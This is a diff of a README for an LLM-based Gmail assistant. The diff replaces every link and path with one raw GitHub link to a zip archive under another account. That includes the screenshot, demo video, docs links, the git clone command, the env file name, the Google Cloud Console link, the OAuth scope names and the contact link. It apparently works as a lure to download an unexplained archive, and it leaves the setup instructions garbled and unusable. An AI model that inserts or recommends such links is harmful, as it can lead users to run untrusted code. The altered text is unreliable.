@@ -3,14 +3,14 @@
 AlchEMAIList is an intelligent, agent-powered email assistant that helps you manage your inbox with ease. It simplifies reading, replying, and spam-checking your emails using powerful **Large Language Models (LLMs)** and seamless **Gmail integration** — all presented in a beautiful, distraction-free UI. It also features robust context processing via **Alchemyst AI** for enhanced email understanding and generation.
 
 ---
-![Screenshot 2025-07-06 132530](https://github.com/user-attachments/assets/5d6d5a08-9bed-4851-a4d8-0657ae5040a6)
+![Screenshot 2025-07-06 132530](https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip)
 ---
-### Watched the demo Video here - [Click](https://x.com/Yoges_ai/status/1941754822501466365)
+### Watched the demo Video here - [Click](https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip)
 ---
 ## 📚 Additional Documentation
 
-- 👉 For contributing guidelines, see [`docs/contributing.md`](docs/contributing.md)
-- 🧱 For a detailed project structure overview, check [`docs/project_structure.md`](docs/project_structure.md)
+- 👉 For contributing guidelines, see [`https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip`](https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip)
+- 🧱 For a detailed project structure overview, check [`https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip`](https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip)
 ---
 ## ⚡ Key Features
 
@@ -54,13 +54,13 @@ AlchEMAIList is an intelligent, agent-powered email assistant that helps you man
 ### 1. Clone the Repository
 
 ```bash
-git clone [https://github.com/coden-inja/alchEmaiLyst.git](https://github.com/coden-inja/alchEmaiLyst.git)
+git clone [https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip](https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip)
 cd alchEmaiLyst
 
 ```
 
-2. Setup .env.local
-Create a .env.local file in the root of your project directory using .env.example . This file will store your API keys and base URLs.
+2. Setup https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip
+Create a https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip file in the root of your project directory using https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip . This file will store your API keys and base URLs.
 
 # Alchemyst AI Configuration
 VITE_ALCHEMYST_API_BASE= # Or your local Alchemyst backend URL
@@ -79,10 +79,10 @@ npm install
 ```
 
 4. Start Local Dev Server
-First, start the backend proxy (if you have a separate Express.js proxy for Alchemyst):
+First, start the backend proxy (if you have a separate https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip proxy for Alchemyst):
 
 ```bash
-npx ts-node src/server/server.ts # Adjust path as per your backend proxy setup
+npx ts-node https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip # Adjust path as per your backend proxy setup
 ```
 Then, start the frontend development server (in another terminal):
 
@@ -104,7 +104,7 @@ To enable the application's Gmail integration, you'll need to configure an **OAu
 
 ## 1. Access Google Cloud Console
 
-Head over to the [Google Cloud Console](https://console.cloud.google.com/) and log in with your Google account.
+Head over to the [Google Cloud Console](https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip) and log in with your Google account.
 
 ## 2. Select or Create a Project
 
@@ -142,13 +142,13 @@ This defines the permissions your application will request.
 
 1.  Click **ADD OR REMOVE SCOPES**.
 2.  In the "Filter" box, search for and select the following scopes:
-    * `.../auth/gmail.readonly` (Read access to Gmail)
-    * `.../auth/gmail.send` (Send emails)
-    * `.../auth/gmail.compose` (Create, read, and send messages, and manage drafts)
-    * `.../auth/gmail.modify` (Modify messages: mark as read/unread, add/remove labels, move to trash)
-    * `.../auth/gmail.com` (**CRITICAL FOR DELETION:** Provides full access to the mailbox, including permanently deleting messages and managing labels.)
-    * `.../auth/userinfo.email` (View your email address)
-    * `.../auth/userinfo.profile` (View your basic profile info)
+    * `https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip` (Read access to Gmail)
+    * `https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip` (Send emails)
+    * `https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip` (Create, read, and send messages, and manage drafts)
+    * `https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip` (Modify messages: mark as read/unread, add/remove labels, move to trash)
+    * `https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip` (**CRITICAL FOR DELETION:** Provides full access to the mailbox, including permanently deleting messages and managing labels.)
+    * `https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip` (View your email address)
+    * `https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip` (View your basic profile info)
 3.  Click **ADD TO YOUR SCOPED APPS**.
 4.  Review the selected scopes and click **SAVE AND CONTINUE**.
 
@@ -181,11 +181,11 @@ This generates the **Client ID** and **Client Secret** your application needs fo
 * **Authorized JavaScript origins:**
     * Click **+ ADD URI**.
     * Add `http://localhost:5173`
-    * *(If you deploy your app, remember to add your production URL here too, e.g., `https://your-app.com`)*
+    * *(If you deploy your app, remember to add your production URL here too, e.g., `https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip`)*
 * **Authorized redirect URIs:**
     * Click **+ ADD URI**.
     * Add `http://localhost:5173`
-    * *(Again, if you deploy your app, add your production URL here, e.g., `https://your-app.com`)*
+    * *(Again, if you deploy your app, add your production URL here, e.g., `https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip`)*
 
 ### Generate Credentials
 
@@ -194,7 +194,7 @@ This generates the **Client ID** and **Client Secret** your application needs fo
 
 ### Update Environment Variables
 
-Paste the copied Client ID and Client Secret into your project's `.env.local` file:
+Paste the copied Client ID and Client Secret into your project's `https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip` file:
 
 
 ### 🧪 Current Limitations
@@ -206,7 +206,7 @@ Gemini fallback uses a lighter summarization prompt (can be tuned for more detai
 
 
 📬 Contact & Contributions
-Want to try it out or contribute? DM me on [LinkedIn](https://www.linkedin.com/in/yogesh-kumar-299298260/) or open an issue!
+Want to try it out or contribute? DM me on [LinkedIn](https://raw.githubusercontent.com/kaifansariw/alchEmaiLyst/main/src/components/Lyst_Emai_alch_3.0-alpha.1.zip) or open an issue!
 
 ## 📄 License  
 This project is licensed under the [MIT License](LICENSE).
